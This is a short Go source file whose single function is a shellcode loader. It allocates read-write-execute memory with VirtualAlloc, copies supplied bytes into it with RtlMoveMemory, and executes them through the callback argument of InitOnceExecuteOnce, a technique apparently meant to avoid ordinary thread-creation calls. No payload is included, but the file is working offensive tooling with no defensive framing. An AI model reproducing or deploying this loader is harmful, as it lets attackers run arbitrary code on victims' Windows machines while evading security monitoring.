package TT

import (
	"syscall"
	"unsafe"
)

var (
	g_InitOnce uintptr
	lpContext  uintptr
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	NULL                   = 0
)

var (
	kernel32            = syscall.MustLoadDLL("kernel32.dll")
	ntdll               = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
	InitOnceExecuteOnce = kernel32.MustFindProc("InitOnceExecuteOnce")
	GetCurrentProcess   = kernel32.MustFindProc("GetCurrentProcess")
	RtlMoveMemory       = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	GetCurrentProcess.Call()
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	InitOnceExecuteOnce.Call((uintptr)(unsafe.Pointer(&g_InitOnce)), addr, NULL, (uintptr)(unsafe.Pointer(&lpContext)))
}
